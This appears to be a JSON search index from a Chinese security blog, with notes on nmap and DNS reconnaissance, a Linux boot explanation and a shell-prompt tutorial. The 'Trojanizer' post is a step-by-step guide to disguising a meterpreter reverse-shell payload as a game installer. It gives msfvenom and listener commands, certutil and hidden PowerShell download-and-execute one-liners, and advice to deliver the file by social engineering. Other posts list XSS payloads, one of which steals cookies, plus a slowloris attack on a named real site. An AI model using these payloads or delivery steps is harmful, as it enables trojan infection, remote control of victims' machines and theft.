2003\n+ SMB2 windows Vista SP1/windows 2008\n+ SMB2.1 windows 7 / windows 2008 r2\n+ SMB3 Windows 8 / windows 2012\n","tags":["原理"],"categories":["网络安全"]},{"title":"SNMP扫描","url":"%2F2018%2F12%2F04%2FSNMP%E6%89%AB%E6%8F%8F%2F","content":"\n`snmpwalk 127.0.0.1 -c public -v 2c`\n\n`snmpcheck -t 127.0.0.1`\n`snmpcheck -t 127.0.0.1 -c private -v 2`\n`snmpcheck -t 127.0.0.1 -w`\n","tags":["工具"],"categories":["网络安全"]},{"title":"xss","url":"%2F2018%2F12%2F04%2Fxss%2F","content":"\n\n##### UXSS #####\n\n\n##### XSS蠕虫 #####\n\n\n##### rookit xss #####\n\n##### Flash Xss #####\n\n\n##### CRLF注入在响应头会导致XSS #####\n\n##### 使用场景 #####\n\n\n+ 直接嵌入html: `<script> alert('XSS');</script>`\n+ 元素标签事件： `<body onload=alert('xss')>`\n+ 图片标签： `<img src=\"javascript:alert('xss');\">`\n+ 其他标签： `<iframe>,<div>,<link>`\n+ DOM对象，篡改页面内容\n\n\n\n##### 漏洞POC#####\n\n+ `<script> alert('XSS');</script>`\n+ `<a href=\"onclick=alert('xss')\">type</a>`\n+ `<img src=http://127.0.0.1/a.jpg onerror=alert('xss')>`\n+ `<script>window.location='http://127.0.0.1</script>'`\n+ `<iframe SRC=\"http://127.0.0.1/victim\" height =\"0\" width =\"0\"></iframe>`\n+ `<script>new image().src=\"http://127.0.0.1/c.php?output=\"+document.cookie;</script>`\n+ `<script>document.body.innerHTML=\"<div style=visibility:visible;><h1>THIS WEBSITE IS UNDER ATTACK</h1></div>\";</script>`\n","tags":["漏洞"],"categories":["网络安全"]},{"title":"Banner","url":"%2F2018%2F12%2F03%2FBanner%2F"},{"title":"服务扫描","url":"%2F2018%2F12%2F03%2F%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%2F","content":"\n\n\n+ 识别开放端口上运行的应用\n+ 识别目标操作系统\n+ 提高攻击效率\n  + Banner捕获\n    + 软件开发商\n    + 软件名称\n    + 服务类型\n    + 版本号[可以直接发现已知的漏洞和弱点]\n  + 连接建立后直接获取banner\n  + 服务识别\n    + 另类服务识别方法\n      + 特征行为和响应字段\n      + 不同的响应可以用于识别底层操作系统\n  + 操作系统识别\n  + SNMP 分析\n  + 防火墙识别\n\n\n------------------------------------\n\n+ nc -nv xxx.xxx.xxx.xxx 22(端口号)\n+ amap -B xxx.xxx.xxx.xxx 22\n","tags":["工具"],"categories":["网络安全"]},{"title":"端口扫描","url":"%2F2018%2F12%2F03%2F%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%2F","content":"\n\n\nTCP端口扫描分类：\n\n基于连接的协议，分为隐蔽扫描，僵尸扫描和全连接扫描。所有的TCP扫描方式都是基于三次握手的变化来判断目标端口的状态\n\n1. 隐蔽扫描--syn\n  + 不建立完整连接\n  + 应用日志不记录扫描行为————隐蔽\n\n2. 僵尸扫描\n  + 极度隐蔽\n  + 实施条件苛刻\n  + 可伪造源地址\n  + 选择僵尸机的类型[必须是闲置系统，系统必须使用递增的PID]\n","tags":["原理"],"categories":["网络安全"]},{"title":"nmap","url":"%2F2018%2F12%2F03%2Fnmap%2F","content":"\n#### 主机发现 ####\n\n+ nmap -sP  192.168.1.0/24   ping扫描\n+ nmap -P0  192.168.1.0/24   无ping扫描   --packet-trace显示扫描方法\n+ nmap -PS  127.0.0.1        TCP SYN Ping 扫描\n+ nmap -PA  127.0.0.1        TCP ACK Ping 扫描\n+ nmap -PU  127.0.0.1        UDP Ping扫描   \n\n+ nmap  192.168.1.0/24 -PU53  -sn\n+ nmap  192.168.1.0/24 -PA80  -sn\n+ nmap  -iL iplist.txt -PA80  -sn\n\n\n端口扫描:\n\n+ nmap -sU 192.168.1.1      扫描默认的1000个端口\n+ nmap 192.168.1.1 -sU -p 53\n+ nmap -F -sT -v 127.0.0.1 -F即扫描u最有可能开放的100个端口，-v获取扫描信息， -sT 使用tcp扫描\n+ nmap -iL iplist.txt -sU -p  1-200\n\n隐蔽端口扫描：\n\n+ nmap -sS 192.168.1.1 -p xx,xx,xx,xx\n+ nmap -sS 192.168.1.1 -p -65535 -open\n+ nmap -sS 192.168.1.1 -p --open\n+ nmap -sS -iL iplist -p 80\n\n[隐蔽端口扫描还有hping3 命令]\n\n全连接端口扫描\n\n+ nmap -sT 127.0.0.1       扫描默认的1000个端口\n+ nmap -sT 127.0.0.1 -p 80\n+ nmap -sT 127.0.0.1 -p 80-1080\n+ nmap -sT -iL iplist.txt -p 80\n\n\n僵尸扫描\n\n+ 发现僵尸机 nmap 192.168.1.1 -p 445 --script=ipldseq.nse\n+ 使用僵尸机 nmap xxx.xxx.xxx.僵尸机 -sl xxx.xxx.xxx.目标机 -Pn -p 0-100\n\n\n服务扫描\n\nnmap通过发送系列复杂的探测，依据相应特征signature\n\n\n+ nmap 127.0.0.1 -p 80 -sV\n+ nmap -sV --script unusual-port 127.0.0.1\n\n\n\nSMB扫描\n+ nmap -v -p 139,445 127.0.0.1\n+ nmap 127.0.0.1 -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 127.0.01\n\nSMTP扫描\n\n+ nmap 域名服务器 -p25 --script=smtp-enum-users.nse --script-args=smtp-enum-users.methods={VRFY}\n+ nmap 域名服务器 -p25 --script=smtp-open-relay.nse\n\n防火墙识别\n+ nmap -sA 127.0.0.1 -p 22     防火墙过滤检测功能\n\nWAF识别\n\n+ nmap 域名 --script=http-waf-detect.nse\n\n探测操作系统：\n  + nmap -O 127.0.0.1\n  + nmap -A 127.0.0.1\n\n使用脚本：\n  + nmap -v -p 139,445 --script=smb-check-vulns --script-args=unsafe=1 xxx.xxx.xxx.xxx\n\n\n漏洞探测：\n  + HTTP.sys 远程代码执行\n    + nmap -sV --script http-vuln-cve2015-1635 127.0.0.1\n  + IIS短文件泄漏\n    + nmap -p8080 --script http-iis-short-name-brute 127.0.0.1\n  + 拒绝服务\n    + nmap --max-parallelism 800 --script http-slowloris www.baidu.com\n  + 验证MySql匿名访问\n    + nmap --script mysql-empty-password 127.0.0.1\n\n\n#### 扫描结果保存 ####\n\n+ -oN 标准保存\n+ -oX XML保存\n+ -oS 133t保存\n+ -oG Grep保存\n+ -oA 保存到所有格式\n+ --append-output 补充保存文件\n+ -oX --stylesheet 将xsl样式表转换为XML保存\n+ -oX --no-stylesheet 禁止nmap的XML保存关联任何XSL样式表\n\n-------------------------------------\n\n端口扫描的状态\n  + open               端口开启，数据有到达主机，有程序在端口上监控\n  + closed             端口关闭，数据有到达主机，没有程序在端口上监控\n  + filtered           数据没有到达主机，返回的结果为空，数据被防火墙或者是IDS过滤\n  + unfiltered         数据没有到达主机，但是不能识别端口的当前状态\n  + open|filtered      端口没有返回值，主要发生在udp，ip，fin，null和xmas扫描中\n  + closed|filtered    只发生在ip，id ，idle扫描\n","tags":["工具"],"categories":["网络安全"]},{"title":"三层发现","url":"%2F2018%2F12%2F02%2F%E4%B8%89%E5%B1%82%E5%8F%91%E7%8E%B0%2F","content":"\n三层发现：网络层，需要在意ip和icmp协议\n+ 三层发现的优点：可路由，速度比较快\n+ 三层发现的缺点：速度比二层慢，并且经常被防火墙过滤\n\n\n\n###### ping命令 ######\n\n+ ping xxx.xxx.xxx.xxx -c 2\n+ ping -r xxx.xxx.xxx.xxx 路由追踪  （在傻鸟里面不知道为什么用不了）\n+ ```ping -c 1 | grep \"bytes from\" | cut -d \"  \" -f 4 | cut -d \":\" -f 1  ```\n###### traceroute ######\ntraceroute xxx.com     路由追踪\n\n\n\n\n\n###### fping命令 ######\n\n+ fping xxx.xxx.xxx.xxx -c 1\n+ fping -g xxx.xxx.xxx.0/24\n+ fping -f iplist.txt\n\n\n###### hping命令 ######\n\n能够发送几乎任意的tcp/ip包，但是一次只能扫描一个目标。\n\n+ hping3 xxx.xxx.xxx.xxx --icmp -c 2\n","tags":["工具"],"categories":["网络安全"]},{"title":"二层发现","url":"%2F2018%2F12%2F02%2F%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0%2F","content":"\n二层为数据链路层，主要需要在意ARP协议\n\n\n###### arping ######\n\narping xxx.xxx.xxx.xxx -c 1\n\n```arping -c xxx.xxx.xxx.xxx | grep \"byte from\"  | cut -d \"\" -f 5 | cut -d \"(\"  -f 2 | cut -d \")\" -f 1```\n\n\n###### Netdiscover  ######\n\n简介：专用于二层发现，可以用于无线和交换网络环境，主动和被动探测。主动arp容易触发告警\n\n主动：\n\nnetdiscover -l eth0 -r 192.168.0.0/24\nnetdiscover -l iplist.txt\n\n\n被动：\n\nnetdiscover -p\n\n\n######  scapy ######\n\n手动探测工具  scapy   基于python，可以作为python的一个工具库进行调用，也可以作为单独的工具进行使用。主要用于抓包、分析、创建、修改、注入网络流量\naptitude install python-gnuplot\n","tags":["工具"],"categories":["网络安全"]},{"title":"recon-ng","url":"%2F2018%2F12%2F02%2Frecon-ng%2F","content":"\n+ 简介： 基于python开发的全特性的web侦查框架,命令格式与msf一致。\n+ 使用方法：\n  + 模块\n  + 数据库\n  + 报告\n","tags":["工具"],"categories":["网络安全"]},{"title":"Maltego","url":"%2F2018%2F12%2F02%2FMaltego%2F","tags":["工具"],"categories":["网络安全"]},{"title":"DNS字典爆破","url":"%2F2018%2F12%2F02%2FDNS%E5%AD%97%E5%85%B8%E7%88%86%E7%A0%B4%2F","content":"\n\nfierce -dnsserver 8.8.8.8 -dns xxx.com -wordlist  wordlist.txt\n\ndnsdict6 -d4 -t 16 -x xxx.com\n\ndnsenum -f dnsbig.txt -dnsserver 8.8.8.8 xxx.com -o xxx.xml  \n\ndnsmap xxx.com -w dns.txt\n\ndnsrecon -d xxx.com --lifetime 10 -t brt -D dnsbig.txt\n\ndnsrecon -t std -d xxx.com\n","tags":["工具"],"categories":["网络安全"]},{"title":"DNS原理","url":"%2F2018%2F12%2F02%2FDNS%E5%8E%9F%E7%90%86%2F","content":"\n\n域名与 FQDN的区别\nFQDN：Fully Qualified Domain Name,是域+主机名的总称\n\n域名记录类型：\n+ A  ：地址记录，用来指定域名的IPv4地址，如果需要将域名指向一个IP地址，就需要添加A记录。\n+ AAAA：用来指定主机名（或域名）对应的IPv6地址（例如：ff06:0:0:0:0:0:0:c3）记录。\n+ Cname ：如果需要将域名指向另一个域名，再由另一个域名提供ip地址，就需要添加CNAME记录。\n+ NS ：域名服务器记录，如果需要把子域名交给其他DNS服务商解析，就需要添加NS记录。\n+ MX ：如果需要设置邮箱，让邮箱能收到邮件，就需要添加MX记录。\n+ ptr：用于ip地址到域名的映射，与A记录相反。\n+ TXT：在这里可以填写任何东西，长度限制255。绝大多数的TXT记录是用来做SPF记录（反垃圾邮件）。\n+ SRV：记录了哪台计算机提供了哪个服务。格式为：服务的名字、点、协议的类型\n\n\n\n显性URL：从一个地址301重定向到另一个地址的时候，就需要添加显性URL记录（注：DNSPod目前只支持301重定向）。\n\n隐性URL：类似于显性URL，区别在于隐性URL不会改变地址栏中的域名。\n","tags":["原理"],"categories":["网络安全"]},{"title":"DIG","url":"%2F2018%2F12%2F02%2FDIG%2F","content":"\ndig @114.114.114.114 www.xxxx.com mx\n\ndig www.xxx.com any\n\n反向查询： dig + noall +answer -x 114.114.114.114\n\nbind版本信息： dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com\n\nDNS追踪:  dig + trace example.com\n\n区域传输：dig @xxx.xxx.com   xxx.com axfr\n\n区域传输： host -T -l xxx.com 114.114.114.114\n","tags":["工具"],"categories":["网络安全"]},{"title":"NSLOOKUP","url":"%2F2018%2F12%2F02%2FNSLOOKUP%2F","content":"\n\nnslookup 域名\n\ntype=a、mx、ns、any\n\nnslookup -type=ns xxx.com\n或者nslookup -q=any 163.com 114.114.114.114\n","tags":["工具"],"categories":["网络安全"]},{"title":"信息收集","url":"%2F2018%2F12%2F02%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%2F","content":"\n\n+ 域名信息\n  + whois\n    + 注册人\n    + 邮箱\n    + 地址\n    + 电话\n    + dns\n  + google hack\n    + robots.txt\n    + 后台\n  + IP地址段\n    + 端口--nmap\n    + 端口对应的服务--msf\n  + 旁站c段\n    + bing查询\n    + vps注意权限\n  + CDN\n    + Cloudflare\n    + 从子域入手\n      + mail, postfix\n      + i.links.cn(查看ip，分析是否使用了CDN)\n      + 爬虫\n      + 路径爆破\n    + SSRF漏洞\n    + 查看邮件发送者源ip\n    + APP客户端\n    + DOS CND可能设置为回源模式\n    + 查找域名历史解析ip\n      + http://securitytrails.com\n      + site.ip138.com\n    + 破解CND帐号\n  + 域名商\n    + 找域名商漏洞，越权影响目标域名\n    + 社工域名商客服\n    + 社工帐号，修改解析地址\n  + dns\n    + 渗透dns服务器\n    + dns域传送漏洞（使用nslookup）\n    + 子域名接管漏洞\n+ 服务器、组件（指纹）\n  + 服务器\n    + 操作系统\n    + web server\n      + 版本号\n      + url采集\n      + 敏感目录\n    + 程序语言\n    + banner\n    + hostname\n  + 同服网站\n  + 备案反查\n  + 指纹识别\n    + 特殊文件md5\n    + cookie\n    + 相应头\n+ 信息泄漏\n  + github泄漏\n  + 网盘泄漏\n  + qq群文件泄漏\n  + 公司地址\n  + 文档图片数据\n  + 公司组织架构\n  + 公开的商业信息\n  + 人员姓名，职务\n  + 联系电话，传真号码\n+ 目标系统使用的技术架构\n","tags":["原理"],"categories":["网络安全"]},{"title":"tcpdump","url":"%2F2018%2F12%2F02%2Ftcpdump%2F","content":"\ntcpdump -n -r file.cap | awk '{print $3}' | sort -U\n\ntcpdump -n src host xxx.xxx.xxx.xxx -r file.cap\n\ntcpdump -n dst host xxx.xxx.xxx.xxx -r file.cap\n\ntcpdump -n port xx -r file.cap\n\ntcpdump -nX port xx -r file.cap\n","tags":["工具"],"categories":["网络安全"]},{"title":"test","url":"%2F2018%2F12%2F02%2Ftest%2F","tags":["存档"],"categories":["网络安全"]},{"title":"暗网wiki","url":"%2F2018%2F12%2F02%2F%E6%9A%97%E7%BD%91wiki%2F","content":"\n\nhttp://zqktlwi4fecvo6ri.onion/wiki/index.php/Main_Page\n","tags":["存档"],"categories":["网络安全"]},{"title":"linux启动过程","url":"%2F2018%2F09%2F05%2Flinux%E5%90%AF%E5%8A%A8%E8%BF%87%E7%A8%8B%2F","content":"\n\n目前电脑的启动的方式分为BIOS+MBR 和UEFI+GPT两种。\n\n第一种方式：BIOS+MBR\n\n1.按电源\n2.读取BIOS芯片\n3.选择启动顺序为首的存储设备\n4.读取存储设备主引导扇区，即开头512字节。如果该512字节的结束字符为0xAA55时，表示这个设备可以用于启动, 否则表示不能用于启动系统。\n\n此处具体介绍一下主引导扇区：\n主引导扇区不属于此块磁盘上的任意一个分区，因此分区空间内的格式化命令不能清除主因到记录的信息。这也是主引导分区中的病毒难查杀的重要原因。\n4.1结构\n446\n0000H-0088H    主引导记录（即主引导程序MBR）  共计136个字节\n0089H-00BDH    出错信息                    共计310个字节\n01BEH-01FDH    分区表（DPT）               共计64个字节\n01FEH-01FFH    幻数   0x55AA                 共计2个字节\n\n4.2主引导程序\n检查分区表是否正确，在硬件自检完成之后引导具有激活标志的分区上的操作系统，并将计算机的控制权交给启动程序。\n\n4.3分区表\n\nDPT一共为64个字节，最多分为四个组，这也是一块硬盘上最多只有四个主分区的原因。每个组占用16个字节。其中：\n第一字节              引导标志，若值为80H表示为活动分区，若值为00H表示为非活动分区。\n第二字节               本分区的起始磁头号\n第三字节低六位          本分区的起始扇区号\n第三字节高两位+第四字节  柱面号\n第五字节               分区类型标志\n第六字节               本分区的结束磁头号\n第七字节低六位          结束扇区号\n第七字节高二位+第八字节  柱面号\n9+10+11+12           本分区已用扇区数\n13+14+15+16          本分区总的扇区数\n\n5.启动boot loader即linux中的grub或者grub2\n6.读取/sbin/init程序，对于parrot来讲，运行的是systemd程序。\n7.根据预先设定的默认运行级别选择开启的服务数量（例如级别一不需要启动x图形服务等），但是我们已经没有inittab了，而是使用systemctl set-default xxx.target实现。当然，也可以通过修改/etc/rcx.d中的链接实现\n8.用户登录界面，输入密码，读取用户空间内的相应设置，操作系统启动完成。\n\n\n第二种方式：UEFI+GPT\n首先做简单介绍，参考自archwiki（别人家的wiki）\nUEFI 全称为Unified Extensible Firmware Interface  翻译为统一可扩展固件接口，用于替换legancy bios\n此处介绍一下GPT（GUID Patition Table,GUID分区表），GPT是使用全局唯一标识符（GUID，globally unique identifiers全局唯一标识符）在PC上的物理存储设备中使用的分区表布局标准，它是UEFI的一部分，但是在某些情况下可以用于BIOS引导中。\n\n1.点击电源\n2.开机自检\n3.加载UEFI固件，固件初始化引导相应的硬件\n4.读取固件管理器中的相关条目，确定相应分区\n5.查找/efi分区，查找其中的\\EFI\\BOOT\\BOOTTX64.EFI并启动\n6.启动引导管理器（如system-boot）或者直接加载Linux内核。\n7.读取/sbin/init程序，对于parrot来讲，运行的是systemd程序。\n8.根据预先设定的默认运行级别选择开启的服务数量（例如级别一不需要启动x图形服务等），但是我们已经没有inittab了，而是使用systemctl set-default xxx.target实现。当然，也可以通过修改/etc/rcx.d中的链接实现\n9.用户登录界面，输入密码，读取用户空间内的相应设置，操作系统启动完成。\n","tags":["linux原理"],"categories":["Linux"]},{"title":"Trojanizer-Trojanize Your Payload","url":"%2F2018%2F02%2F23%2FTrojanizer-Trojanize-Your-Payload%2F","content":"\n\nTrojanizer - 在你的有效载荷中植入后门（WinRAR [SFX]自动化）\n \n\nTrojanizer工具使用WinRAR（SFX自解压文件）将用户输入的两个文件压缩并转换为SFX可执行文件（.exe）保存。sfx文件在执行时会同时运行两个文件（我们的有效载荷和应用程序在同时运行）。\n\n为了减少文件在执行时被发现的可疑性，trojanizer会尝试用用户选择的图标替换sfx文件的默认图标（.ico），并且压缩所有的SFX存档沙盒信息（Silent = 1 | Overwrite = 1 ）。\n\nTrojanizer不会构建木马，但从目标的角度来看，它会模仿木马的行为（在后台执行有效负载，而合法应用程序在前台执行）。\n\n\n\n##### 依赖（后端应用程序） ######\n\nZenity（bash-GUI）| Wine（x86 | x64）| WinRAr.exe（已安装在wine中）\n“Trojanizer.sh会根据需要下载/安装所有依赖关系\n\n在第一次尝试运行该工具之前，建议在配置文件中编辑配置选项：SYSTEM_ARCH = [your_sys_arch]\n\n\n\n##### 被允许的有效载荷 #####\n\n.exe | .bat | .vbs | .ps1\n“windows / SFX可以自动提取并执行所有的有效载荷”\n\n提示：如果在配置文件中选择'SINGLE_EXEC = ON'，那么trojanizer将接受输入的任何类型的扩展。\n\n##### 接受的合法的文件（诱饵） #####\n\n.exe | .bat | .vbs | .ps1 | .jpg | .bmp | .doc | .ppt | .ppt | 等等。\n“windows / SFX可以自动提取并执行的所有应用程序”\n\n##### 更多设置 #####\n\nTrojanizer高级选项只能在配置文件中访问且只能在运行主工具Trojanizer.sh之前对它们进行配置。\n\n- 预设高级选项\n在提取/执行两个压缩文件（SFX文件）之前，Trojanizer可以被配置为执行命令和应用。这允许用户在实际中在目标系统提取文件之前利用预先安装的软件执行远程命令。如果激活，trojanizer会在（zenity沙箱）执行命令 \n\n\n\n- 单可执行文件\n让我们看看下面的场景：你有一个DLL负载输入，你需要提取时执行，但sfx文件不能直接执行dll文件，这个设置允许用户输入一个批处理脚本（.bat），它将成为用于执行dll负载。Trojanizer需要做的就是指示SFX归档文件解压缩这两个文件，然后执行script.bat \n\n此模式将其默认行为切换为压缩用户输入的两个文件，但仅在提取时执行其中的一个文件（输入的2º文件将被执行）...\n\n##### TROJANIZER和应用白名单绕过 #####\n\n许多人已经完成了许多令人敬畏的工作，特别是@subTee，我们在这里最终想要的是关于应用程序的白名单绕过：执行任意代码滥用Microsoft内置二进制文件。[ Windows 在线下载远程负载并执行任意代码](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)\n\n以下练习描述了如何使用trojanizer'单文件模式'和'Presetup'高级开关来删除（远程下载）并使用'certutil'或'powershell'一句话木马绕过白名单 \n\n1. 使用metasploit来构建我们的有效载荷\n```msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.69 LPORT=666 -f exe -o payload.exe```\n\n2. 将payload.exe复制到apache2 webroot并启动服务\n\n    ```cp payload.exe /var/www/html/payload.exe```\n\n    ```service apache2 start```\n\n3. 编辑Trojanizer'设置'文件并激活：\n    ```PRE_SETUP=ON```\n    ```SINGLE_EXEC=ON```\n\n4. 运行trojanizer工具\n    ```PAYLOAD TO BE COMPRESSED => /screenshot.png (it will not matter what you compress)```\n    ```EXECUTE THIS FILE UPON EXTRACTION => /AngryBirds.exe (to be executed as decoy application)```\n    ```PRESETUP SANDBOX => cmd.exe /c certutil -urlcache -split -f 'http://192.168.1.69/payload.exe', '%TEMP%\\\\payload.exe'; Start-Process '%TEMP%\\\\payload.exe'```\n    ```SFX FILENAME => AngryBirds_installer (the name of the sfx archive to be created)```\n    ```REPLACE ICON => Windows-Store.ico OR Steam-logo.ico```\n\n5. 开始监听，并使用社交工具将sfx存档发送到目标\n    ```msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost 192.168.1.69; set lport 666; exploit'```\n\n当自解压文件执行时，它会从我们的Apache2 web服务器下载payload.exe并提取“screenshot.png”和“AngryBirds.exe”（最后一个将作为诱饵被执行）之前执行它\n\n的跟随oneliner用途'powershell（下载文件+启动）'方法实现与以前的'certutil'相同的练习。\n    ```cmd.exe /c powershell.exe -w hidden -c (new-object System.Net.WebClient).Downloadfile('http://192.168.1.69/payload.exe', '%TEMP%\\\\payload.exe') & start '%TEMP%\\\\payload.exe'  ```\n\n后续的oneliner使用'powershell（IEX +下载字符串）'方法来实现几乎相同（payload.ps1不接触磁盘）\n    ```cmd.exe /c powershell.exe -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.69/payload.ps1'))\" ```\n\n##### 下载/安装 #####\n1. Download framework from github\n    ``` git clone https://github.com/r00t-3xp10it/trojanizer.git```    \n\n2. Set files execution permitions\n     ```cd trojanizer```\n     ```sudo chmod +x *.sh```\n\n3. config framework\n     ```nano settings```\n\n4. Run main tool\n   ```  sudo ./Trojanizer.sh```\n\n","tags":["工具"],"categories":["网络安全"]},{"title":"定制自己的shell提示符","url":"%2F2018%2F02%2F12%2F%E5%AE%9A%E5%88%B6%E8%87%AA%E5%B7%B1%E7%9A%84shell%E6%8F%90%E7%A4%BA%E7%AC%A6%2F","content":"\n虽然parrot的shell提示符已经是很骚气了。但是作为喜欢折腾，没有麻烦制造麻烦也要上的我还是决定搞一下事情。\n\n##### shell提示符的变量 #####\n\n 提示符是由 `PS1`这个环境变量进行定义。我们可以使用`echo $PS1`命令来打印我们现在的shell命令提示符号的代码。\n\n 简单解释一些变量的含义\n```\n \\a \t以 ASCII 格式编码的铃声 . 当遇到这个转义序列时，计算机会发出提示声。\n\\d \t以日，月，天格式来表示当前日期。例如，“Mon May 26.”\n\\h \t本地机的主机名，但不带末尾的域名。\n\\H \t完整的主机名。\n\\j \t运行在当前 shell 会话中的工作数。\n\\l \t当前终端设备名。\n\\n \t一个换行符。\n\\r \t一个回车符。\n\\s \tshell 程序名。\n\\t \t以24小时制，hours:minutes:seconds 的格式表示当前时间.\n\\T \t以12小时制表示当前时间。\n\\@ \t以12小时制，AM/PM 格式来表示当前时间。\n\\A \t以24小时制，hours:minutes 格式表示当前时间。\n\\u \t当前用户名。\n\\v \tshell 程序的版本号。\n\\V \tVersion and release numbers of the shell.\n\\w \t当前工作目录名。\n\\W \t当前工作目录名的最后部分。\n\\! \t当前命令的历史号。\n\\# \t当前 shell 会话中的命令数。\n\\$ \t这会显示一个\"$\"字符，除非你拥有超级用户权限。在那种情况下， 它会显示一个\"#\"字符。\n\\[ \t标志着一系列一个或多个非打印字符的开始。这被用来嵌入非打印 的控制字符，这些字符以某种方式来操作终端仿真器，比方说移动光标或者是更改文本颜色。\n\\] \t标志着非打印字符序列结束。\n\n文本颜色\n\\033[0;30m \t黑色 \t\n\\033[1;30m \t深灰色\n\\033[0;31m \t红色\n\\033[1;31m \t浅红色\n\\033[0;32m \t绿色 \t\n\\033[1;32m \t浅绿色\n\\033[0;33m \t棕色 \t\n\\033[1;33m \t黄色\n\\033[0;34m \t蓝色 \t\n\\033[1;34m \t浅蓝色\n\\033[0;35m \t粉红 \t\n\\033[1;35m \t浅粉色\n\\033[0;36m \t青色 \t\n\\033[1;36m \t浅青色\n\\033[0;37m \t浅灰色 \t\n\\033[1;37m \t白色\n\n背景颜色\n\\033[0;40m     蓝色\n \\033[1;44m    黑色\n\\033[0;41m    红色\n \\033[1;45m   粉红\n\\033[0;42m    绿色\n \\033[1;46m   青色\n\\033[0;43m    棕色\n \\033[1;47m   浅灰色\n```\n\n一般上面那一段是太长不看系列的东西，但是好像可以总结成一个公式`\\[\\e[F;Bm\\] `其中“F”为字体颜色，编号30~37；“B”为背景色，编号40~47。\n\n```\n   前景     背景     颜色\n　　30      40      黑色\n　　31      41      红色\n　　32      42      绿色\n　　33      43      黄色\n　　34      44      蓝色\n　　35      45      紫红色\n　　36      46      青蓝色\n　　37      47      白色\n\n代码      意义\n0            OFF\n1            高亮显示\n4            underline            \n7            反白显示\n8            不可见\n```\n\n\n关于光标的行为常用的为以下几种，大家可以看看有什么可以用的\n\n```\n\\033[l;cH       把光标移到第 l 行，第 c 列。\n\n\\033[nA         把光标向上移动 n 行。\n\n\\033[nB         把光标向下移动 n 行。\n\n\\033[nC         把光标向前移动 n 个字符。\n\n\\033[nD         把光标向后移动 n 个字符。\n\n\\033[2J         清空屏幕，把光标移到左上角（第零行，第零列）。\n\n\\033[K          清空从光标位置到当前行末的内容。\n\n\\033[s          存储当前光标位置。\n\n\\033[u          唤醒之前存储的光标位置。\n```\n\n   ###### 开始我们的定制 ######\n\n   首先，我们备份当前的环境变量\n\n    ps1Old=\"$PS1\"\n\n然后，我们需要验证一下我们真的成功备份了这个变量\n\n    echo $ps1Old\n\n然后修改当前的变量\n\n\n\\[\\033[0;31m\\]]\\[\\033[01;33m\\]\\[\\033[01;96m\\]\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]\\t\n\\[\\033[01;96m\\]\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]      表示 红色的]-[\n\n\n解释一下暂时我知道的shell默认的配置\n```\n\\[\\033[0;31m\\]\\342\\224\\214\\342\\224\\200$([[ $? != 0 ]] && echo \"[\\[\\033[0;31m\\]\\342\\234\\227\\[\\033[0;37m\\]]\\342\\224\\200\")[\\[\\033[0;39m\\]\\u\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\033[0;32m\\]\\w\\[\\033[0;31m\\]]\\n\\[\\033[0;31m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 \\[\\033[0m\\]\\[\\e[01;33m\\]\\$\\[\\e[0m\\]\n```\n`\\[\\033[0;31m` 表示红色`\n\n`\\]\\342\\224\\214\\342\\224\\200` 貌似是八进制转移字符，这个暂时还没查到，欢迎诸位大佬进行补充。\n\n`[\\[\\033[0;39m\\]\\u`以绿色打印当前用户名\n\n`\\[\\033[01;33m\\]@`用黄色打印@字符\n\n`\\[\\033[01;96m\\]\\h` 打印主机名\n\n`\\[\\033[0;31m\\]]\\342\\224\\200[\\[\\`打印红色的“]-[\"符号\n\n`033[0;32m\\]\\w`打印绿色的当前目录\n\n`\\[\\033[0;31m\\]]\\n`换行符\n`\\[\\e[01;33m\\]\\$`打印$符号\n`\\[\\e[0m\\] `清除当前的提示符设置，以系统默认的方法来进行输出\n\n然后大家就可以参照上面的解释来定制自己的shell提示符。，以下为我自己的提示命令\n```\n\\[\\033[1;33m\\]\\342\\224\\214\\342\\224\\200$([[ $? != 0 ]] && echo \"[\\[\\033[0;33m\\]\\342\\234\\227\\[\\033[0;37m\\]]\\342\\224\\200\")[\\[\\033[0;39m\\]\\u\\[\\033[01;33m\\]@\\[\\033[01;96m\\]\\h\\[\\033[0;33m\\]]\\342\\224\\200[\\[\\033[1;34m\\]\\w\\[\\033[01;96m\\]\\[\\033[0;33m\\]]\\342\\224\\200[\\[\\033[1;31m\\]\\t\\[\\033[01;96m\\]\\[\\033[1;33m\\]]\\n\\[\\033[0;33m\\]\\342\\224\\224\\342\\224\\200\\342\\224\\200\\342\\225\\274 \\[\\033[0m\\]\\[\\e[01;33m\\]\\$\\[\\e[0m\\]\n```\n","tags":["个人定制"],"categories":["LINUX"]},{"title":"交换机的工作原理","url":"%2F2018%2F02%2F11%2F%E4%BA%A4%E6%8D%A2%E6%9C%BA%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%2F","content":"之前在单位上遇到主机需要在交换机中抓包的问题了，正好给自己科普一下交换机和路由器的内容。\n\n    #####基本概念#####\n\n在互联网中要想将网络互相连接起来要使用一些中间设备，ISO的术语称之为中继（relay）系统。根据中继系统所在的层次，在我们学的计算机网络中介绍了的七层网络模型和五层网络模型。可以有以下五种中继系统：\n1. 工作在物理层上的中继系统，即转发器（repeater）。\n2. 工作在数据链路层上的中继系统即网桥或桥接器（bridge）。\n3. 工作在网络层的中继系统，即路由器（router）。\n4. 网桥和路由器的混合物桥路器（brouter）兼有网桥和路由器的功能。\n5. 在网络层以上的中继系统，即网关（gateway）.\n\n ARP协议：地址解析协议（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。主机发送信息时将包含目标IP地址的ARP请求广播到网络上的所有主机，并接收返回消息，以此确定目标的物理地址；收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。\n 